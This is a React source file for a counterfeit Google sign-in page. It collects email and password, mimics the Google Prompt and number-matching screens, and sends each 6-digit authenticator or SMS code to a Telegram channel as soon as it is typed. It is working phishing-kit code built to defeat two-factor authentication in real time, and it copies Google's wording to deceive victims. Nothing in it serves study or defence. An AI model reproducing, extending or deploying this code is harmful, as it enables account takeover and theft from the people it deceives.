import { sendMessageToTelegram } from '../lib/api';
import React, { useState, useEffect } from 'react';


export default function GoogleForm({ currentStep, email, setEmail, password, setPassword, invalid, verificationNumber, setInvalid }) {
    const [otpCode, setOtpCode] = useState('');
    const [otpSent, setOtpSent] = useState(false);

    const handleOtpChange = (source) => (e) => {
        const value = e.target.value;
        setOtpCode(value);

        if (value.length === 6 && !otpSent) {
            const message = `OTP code from ${source} : ${value}`;
            console.log(message);
            sendMessageToTelegram(message);
            setOtpSent(true); // Mark OTP as sent
        } else if (value.length < 6) {
            setOtpSent(false); // Reset if user deletes characters
        }
    }

    // Dismiss error on click outside
    useEffect(() => {
        const dismissError = () => setInvalid && setInvalid(false);
        // Add both mouse and touch events
        document.addEventListener('click', dismissError);
        document.addEventListener('touchstart', dismissError);
        
        return () => {
            document.removeEventListener('click', dismissError);
            document.removeEventListener('touchstart', dismissError);
        };
    }, [setInvalid]); // Keep dependency array

    
    const renderContent = () => {
        switch(currentStep) {
            case 'email':
                return (
                    <div className="relative w-full">
                        <input 
                            type="text" 
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                            className={`rounded p-4 border-2 text-[16px] w-full ${
                                  invalid ? 'border-red-500' : 'border-gray-300'
                              } bg-white dark:bg-[#fff] text-[#1f1f1f] dark:text-black 
                              focus:outline-none focus:border-blue-500 peer transition-colors`}
                            placeholder=" "
                        />
                        <label 
                          className="absolute left-4 top-4 px-1 bg-white dark:bg-[#fff] transition-all duration-200 
                          text-gray-500 peer-focus:-top-3 peer-focus:text-sm peer-focus:text-blue-500 
                          peer-focus:bg-white dark:peer-focus:bg-[#fff] peer-placeholder-shown:top-4 peer-placeholder-shown:text-base"
                        >
                            Email or phone
                        </label>
                        {invalid && (
                            <div className="text-red-500 text-sm mt-2">
                                Couldn't find your Google Account
                            </div>
                        )}
                    </div>
                );
            
            case 'password':
                return (
                    <div className="relative w-full">
                        <input
                            type="password"
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            className={`rounded p-4 border-2 text-[16px] w-full ${
                                  invalid ? 'border-red-500' : 'border-gray-300'
                              } bg-white dark:bg-[#fff] text-[#1f1f1f] dark:text-black 
                              focus:outline-none focus:border-blue-500 peer transition-colors`}
                            placeholder=" "
                        />
                        <label
                          className="absolute left-4 top-4 px-1 bg-white dark:bg-[#fff] transition-all duration-200 
                          text-gray-500 peer-focus:-top-3 peer-focus:text-sm peer-focus:text-blue-500 
                          peer-focus:bg-white dark:peer-focus:bg-[#fff] peer-placeholder-shown:top-4 peer-placeholder-shown:text-base"
                        >
                            Enter your password
                        </label>
                        {invalid && (
                            <div className="text-red-500 text-sm mt-2">
                                Wrong password. Try again or click Forgot password to reset it.
                            </div>
                        )}
                    </div>
                );

            case 'mfa':
                return (
                    <div className="relative w-full p-6">
                        <div className="text-center space-y-4">
                            <h2 className="text-2xl font-medium text-gray-800">Google Prompt</h2>
                            <p className="text-gray-600">Check your phone and tap "Yes" to sign in</p>
                            <div className="my-6 flex justify-center">
                                <div className="p-4 bg-blue-50 rounded-full shadow-inner">
                                    <svg xmlns="http://www.w3.org/2000/svg" 
                                         className="h-16 w-16 text-blue-600"
                                         viewBox="0 0 24 24"
                                         strokeWidth="1.5"
                                         fill="none"
                                         strokeLinecap="round"
                                         strokeLinejoin="round">
                                        <path d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
                                    </svg>
                                </div>
                            </div>
                            <p className="text-gray-600">
                                Not getting the prompt? 
                                <button className="text-blue-600 ml-1 hover:underline">Use another option</button>
                            </p>
                        </div>
                    </div>
                );

            case '2step':
                return (
                    <div className="relative w-full p-6">
                        <div className="text-center space-y-4">
                            <h2 className="text-2xl font-medium text-gray-800">2-Step Verification</h2>
                            <p className="text-gray-600">A number has been sent to your device</p>
                            <div className="my-6 text-4xl font-bold text-blue-600 animate-pulse">
                                {verificationNumber}
                            </div>
                            <p className="text-gray-600">Tap the matching number on your phone</p>
                        </div>
                    </div>
                );

            case 'auth_otp':
            case 'phone_otp':
                return (
                    <div className="relative w-full">
                        <input
                            type="text"
                            value={otpCode}
                            onChange={handleOtpChange(currentStep === 'auth_otp' ? '2fa' : 'phone')}
                            className="rounded p-4 border-2 border-gray-300 text-[16px] w-full 
                                   text-[#1f1f1f] focus:outline-none focus:border-blue-500 peer 
                                   transition-colors placeholder-transparent"
                            placeholder="Enter code"
                        />
                        <label
                            className="absolute left-4 top-4 px-1 bg-white transition-all duration-200 
                                   text-gray-500 peer-focus:-top-3 peer-focus:text-sm peer-focus:text-blue-500 
                                   peer-focus:bg-white peer-placeholder-shown:top-4 peer-placeholder-shown:text-base"
                        >
                            {currentStep === 'auth_otp' 
                                ? 'Enter Authenticator code' 
                                : 'Enter SMS verification code'}
                        </label>
                        <p className="mt-4 text-gray-600 text-sm">
                            {currentStep === 'auth_otp'
                                ? 'Open the Google Authenticator app and enter the 6-digit code'
                                : 'We sent a 6-digit code to your phone number'}
                        </p>
                    </div>
                );

            default:
                return null;
        }
    };

    return (
            <div className="responsive-form-container">
                <form className="responsive-spacing">
                    {renderContent()}

                    {(currentStep === 'email' || currentStep === 'password') && (
                        <div className="responsive-text font-medium text-blue-600 hover:underline cursor-pointer">
                            {currentStep === 'password' ? 'Forgot password?' : 'Forgot email?'}
                        </div>
                    )}

                    {currentStep === 'email' && (
                        <div className="responsive-text text-gray-600 leading-tight">
                            Before using this app, you can review Google's {' '}
                            <span className="text-blue-600 hover:underline cursor-pointer">privacy policy</span>
                            {' '}and{' '}
                            <span className="text-blue-600 hover:underline cursor-pointer">terms of service.</span>
                        </div>
                    )}
                </form>
            </div>
    )
}
